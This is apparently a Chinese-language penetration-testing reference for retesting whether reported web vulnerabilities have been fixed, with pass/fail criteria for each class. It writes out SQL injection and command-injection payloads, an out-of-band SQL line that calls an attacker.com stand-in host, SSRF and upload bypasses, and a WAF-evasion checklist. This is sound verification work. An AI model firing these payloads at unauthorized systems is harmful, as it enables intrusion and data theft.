# 复测策略参考

本文件提供各漏洞类型的详细复测手法、判定标准和示例。
复测核心原则：用与原始报告相同（或等价）的 PoC 重新触发，对比漏洞特征是否消失。

---

## 1. SQL 注入

### 复测手法

1. **重放原始注入 payload**：保持原始请求完整，仅替换可能过期的认证凭据。
2. **多手法交叉验证**（原始报告用了联合查询，复测也试布尔/时间盲注）：
   - 联合查询：`' UNION SELECT 1,2,3--` → 检查响应是否回显注入数据
   - 布尔盲注：`' AND 1=1--` vs `' AND 1=2--` → 对比响应差异
   - 时间盲注：`'; WAITFOR DELAY '0:0:3'--`（MSSQL）或 `AND SLEEP(3)`（MySQL）→ 检查响应延迟
   - 带外：`' UNION SELECT LOAD_FILE('\\\\attacker.com\\test')--` → DNSLog 检测

### 判定标准

| 响应表现 | 判定 |
|---------|------|
| 联合查询无回显 / 布尔盲注无差异 / 时间盲注无延迟 | ✅ 已修复 |
| 任一手法仍可注入 | ❌ 未修复 |
| 参数被过滤但编码变换后可注入 | ❌ 未修复（WAF 可绕过） |
| 参数被过滤且编码变换后仍不可注入 | ✅ 已修复 |

### 示例

```bash
# 原始 PoC: GET /api/user?id=1' UNION SELECT 1,2,3--
curl -k --max-time 10 --connect-timeout 5 \
  -b "session=新凭据" \
  "https://target.com/api/user?id=1'%20UNION%20SELECT%201,2,3--"

# 对比: 原始报告显示响应含注入数据 → 复测响应无注入数据 → ✅ 已修复
```

## 2. XSS

### 复测手法

#### 反射型 XSS

1. HTTP 重放原始 payload → 检查响应中 payload 是否被转义/过滤。
2. 响应中 payload 未转义 → **必须浏览器访问确认 DOM 中 payload 实际执行**。
3. 浏览器打开 `https://target.com/search?q=<script>alert(1)</script>` → 检查 DOM。

#### 存储型 XSS

1. 浏览器访问原始报告中存储型 XSS 所在的页面。
2. 检查 DOM 中是否仍有存储的 payload 且实际执行。
3. 若 payload 已被清理（入库时过滤/输出时编码）→ DOM 中不执行。

#### DOM 型 XSS

1. 浏览器访问原始 PoC URL（含 hash/fragment payload）。
2. 检查 DOM 中 payload 是否被 sink 执行。

### 判定标准（严格执行）

| 响应表现 | 判定 |
|---------|------|
| HTTP 响应中 payload 被转义（`<` → `&lt;`）且浏览器 DOM 未执行 | ✅ 已修复 |
| HTTP 响应中 payload 未转义但浏览器 DOM 未执行（框架转义） | ✅ 已修复 |
| 浏览器 DOM 中 payload 实际执行（alert 弹出/DOM 插入） | ❌ 未修复 |
| payload 被 CSP 阻止执行 | ✅ 已修复（CSP 防护） |
| CSP 可绕过（`unsafe-inline` 仍允许/有可控 CDN 域） | ❌ 未修复 |

### 关键区分

- **响应中有 payload ≠ 漏洞存在**：React/Vue/Angular 默认转义，响应中有 `<script>` 但 DOM 中不会执行。
- **必须浏览器验证**：API 响应层面看到 payload 不够，需确认 DOM 中实际执行。

## 3. 命令注入 / RCE

### 复测手法

1. 重放原始命令注入 payload。
2. 检查响应中是否有命令执行输出。
3. 使用无害命令验证：`;id` / `|whoami` / `` `id` `` / `$(whoami)`。

### 判定标准

| 响应表现 | 判定 |
|---------|------|
| 命令输出消失（无 `uid=` / `whoami` 结果） | ✅ 已修复 |
| 命令输出仍存在 | ❌ 未修复 |
| payload 被过滤但替代字符可注入（`;` 被过滤但 `\|` 可用） | ❌ 未修复 |
| 所有命令注入字符均被过滤 | ✅ 已修复 |

### 示例

```bash
# 原始 PoC: POST /api/ping with body: host=127.0.0.1;id
curl -k --max-time 10 --connect-timeout 5 \
  -b "session=新凭据" \
  -d "host=127.0.0.1;id" \
  "https://target.com/api/ping"

# 原始报告响应含 "uid=1000(www)" → 复测响应无 uid → ✅ 已修复
```

## 4. SSRF

### 复测手法

#### 有回显 SSRF

1. 重放原始 PoC（URL 参数指向攻击者控制的服务器）。
2. 检查响应中是否包含攻击者服务器返回的内容。

#### 无回显 SSRF（OOB）

1. 生成 Collaborator/DNSLog 监听地址。
2. 替换 PoC 中的 URL 为监听地址 → 重放。
3. 等待 3-5 秒 → 检查交互记录（DNS/HTTP）。

### 判定标准

| 表现 | 判定 |
|------|------|
| 有回显：响应不再包含攻击者服务器内容 | ✅ 已修复 |
| 有回显：响应仍包含攻击者服务器内容 | ❌ 未修复 |
| OOB：无 DNS/HTTP 交互 | ✅ 已修复（或需结合响应判断） |
| OOB：有 DNS/HTTP 交互 | ❌ 未修复 |
| URL 被过滤但编码变换/IP 进制可绕过 | ❌ 未修复 |
| URL 被过滤且编码变换不可绕过 | ✅ 已修复 |

### 常见绕过检查

- IP 进制变换：`127.0.0.1` → `0x7f000001` / `2130706433` / `0177.0.0.1`
- DNS 重绑定：使用短 TTL DNS 指向内网 IP
- URL 协议：`file://` / `gopher://` / `dict://` 是否被过滤
- 域名白名单绕过：`internal.com.attacker.com`

## 5. 文件上传

### 复测手法

1. 重放原始上传请求（上传 webshell/恶意文件）。
2. 检查上传是否成功（响应中是否有文件路径）。
3. 若上传成功 → 尝试访问上传文件验证可执行性。

### 判定标准

| 表现 | 判定 |
|------|------|
| 上传被拒绝（类型/扩展名/内容检查） | ✅ 已修复 |
| 上传成功但文件不可执行（被存储为静态资源/重命名） | ✅ 已修复 |
| 上传成功且文件可执行（可访问 webshell） | ❌ 未修复 |
| 扩展名黑名单可绕过（`.php5` / `.phtml` / `.pht`） | ❌ 未修复 |

## 6. 越权 / IDOR

### 复测手法

1. 使用**非授权账号**的凭据重放原始 PoC。
2. 请求原始报告中越权访问的资源 ID。
3. 检查响应是否仍返回非授权数据。

### 判定标准

| 表现 | 判定 |
|------|------|
| 非授权账号请求返回 403/401/空数据 | ✅ 已修复 |
| 非授权账号请求仍返回他人数据 | ❌ 未修复 |
| ID 从递增改为 UUID 且不可枚举 | ✅ 已修复 |
| UUID 可通过其他接口获取仍可越权 | ❌ 未修复 |

### 注意

- 越权复测必须使用**非授权账号**，不能用原始报告中的高权限账号凭据。
- 仅验证 1 条记录证明可/不可访问，不大规模遍历。

## 7. 反序列化

### 复测手法

1. 重放原始反序列化 payload。
2. 检查响应/服务行为是否有异常（RCE/文件写入/延迟）。
3. OOB 检测：payload 中嵌入 DNSLog 地址 → 检查交互。

### 判定标准

| 表现 | 判定 |
|------|------|
| 服务正常处理请求无异常 | ✅ 已修复 |
| OOB 有交互 / RCE 证据 | ❌ 未修复 |
| payload 被拒绝（类型检查/白名单） | ✅ 已修复 |
| payload 被接受但利用链被阻断 | ✅ 已修复（gadget 链移除） |

---

## 8. 已知 CVE

### 复测手法

1. 按原始 PoC 重放 CVE 利用请求。
2. 检查漏洞特征是否消失（版本升级/补丁/配置修复）。
3. 必要时检查目标版本号是否已升级到修复版本。

### 判定标准

| 表现 | 判定 |
|------|------|
| CVE PoC 重放无漏洞特征 | ✅ 已修复 |
| CVE PoC 重放仍有漏洞特征 | ❌ 未修复 |
| 版本已升级到修复版本但 PoC 仍可用（补丁不完整） | ❌ 未修复 |
| 版本未升级但 PoC 不可用（WAF/配置缓解） | ✅ 已修复（缓解措施） |

---

## 9. 信息泄露

### 复测手法

1. 重放原始请求访问泄露端点。
2. 检查响应是否仍包含敏感信息。

### 判定标准

| 表现 | 判定 |
|------|------|
| 端点返回 403/404/无敏感数据 | ✅ 已修复 |
| 端点仍返回敏感信息（与原始报告一致） | ❌ 未修复 |
| 端点返回部分数据但敏感字段已脱敏 | ✅ 已修复 |

---

## 10. 认证绕过

### 复测手法

1. 重放原始认证绕过 PoC（如空密码/默认凭据/JWT 弱密钥伪造）。
2. 检查是否仍可绕过认证访问受保护资源。

### 判定标准

| 表现 | 判定 |
|------|------|
| 绕过手法失效（返回 401/登录页） | ✅ 已修复 |
| 绕过手法仍有效（可访问受保护资源） | ❌ 未修复 |
| JWT 密钥已更换且无法爆破 | ✅ 已修复 |
| JWT 密钥已更换但仍可爆破（弱密钥） | ❌ 未修复 |

## WAF 绕过检查清单

当复测发现原始 PoC 被 WAF 拦截时，必须检查以下绕过路径后再判定修复状态：

| 路径 | 手法 | 示例 |
|------|------|------|
| 编码变换 | URL/双重/Unicode/Hex 编码 | `'` → `%27` → `%2527` |
| 大小写混淆 | 关键字大小写混合 | `UNION` → `UnIoN` |
| 分隔符注入 | 注释/空白字符替代空格 | ` ` → `/**/` / `%0a` / `%09` |
| 关键字拆分 | 注释分割关键字 | `UNION` → `UN/**/ION` |
| 等价函数 | 使用替代函数/语法 | `SUBSTRING()` → `MID()` |
| HTTP 参数污染 | 同名参数多次提交 | `id=1&id=1' UNION SELECT 1--` |
| Content-Type 变换 | JSON ↔ form ↔ XML | `application/json` → `text/xml` |

> WAF 拦截 + 任一绕过路径成功 = ❌ 未修复
> WAF 拦截 + 所有绕过路径失败 = ✅ 已修复（WAF 防护）
